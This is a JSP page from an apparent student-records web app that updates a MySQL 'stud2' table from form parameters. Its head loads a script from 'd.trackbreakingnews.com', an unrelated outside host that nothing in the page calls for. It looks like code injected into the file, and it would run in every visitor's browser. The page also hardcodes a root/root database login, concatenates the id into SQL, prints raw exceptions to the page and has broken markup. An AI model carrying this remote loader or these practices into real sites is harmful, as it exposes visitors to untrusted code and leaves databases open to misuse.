<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <%@ page import ="java.io.InputStream"  %>
 <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Update</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Front4.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>
</head>
<body>

<%
Connection con=null;
PreparedStatement ps=null;
String st=null;

		String nmx=request.getParameter("id");
		String sx=request.getParameter("name");
		String ms=request.getParameter("email");
		String ad=request.getParameter("cr");
		String gr=request.getParameter("sm");
		String ex=request.getParameter("ph");
		String id=request.getParameter("addr");
		String fof=request.getParameter("fof");
		String mop=request.getParameter("mop");
		String foe=request.getParameter("foe");
	
        int nm=Integer.parseInt(nmx);
try 
{
	Class.forName("com.mysql.jdbc.Driver");
	con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
	st="update stud2 set sid=?,fname=?,email=?,course=?,sem=?,fone=?,address=?,ffone=?,moccu=?,gmail=? where sid='"+nm+"'";
	ps=con.prepareStatement(st);
		ps.setInt(1,nm);
		ps.setString(2,sx);
		ps.setString(3, ms);
		ps.setString(4, ad);
		ps.setString(5, gr);
		ps.setString(6, ex);
		ps.setString(7,id);
		ps.setString(8,fof);
		ps.setString(9,mop);
		ps.setString(10, foe);
		
	int i=ps.executeUpdate();
	if(i>0) {
		out.println("<body><style> .L h2 { font-family:Droid Sans; font-size:2.2em;	padding-top: 15px;height:50px;width: 280px;background: #000;font-family: Lato;display: block;color: #fff;line-height: 21px;margin: 7px;padding-left: 20px;border-radius: 4px;background: rgba(0,0,0,0.5);position:relative; margin-left: 280px;top:-595px; } </style> <div class=L> <h2>Profile Upadated!</h2></div>");
		request.getRequestDispatcher("ManageStud.jsp").include(request, response);
	} else {
		out.println("Fill all Fields");
		request.getRequestDispatcher("UpdateStud.jsp").include(request, response);
		
	}
	con.close();
}catch(Exception e) { out.println(e);}
%>


</body>
</html>
  <script src="jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
	$('.dropdown').hover(function() {
		$('.dropdown-toggle',this).trigger('click');
	});
	</script>
  </body>
</html>

</body>
</html>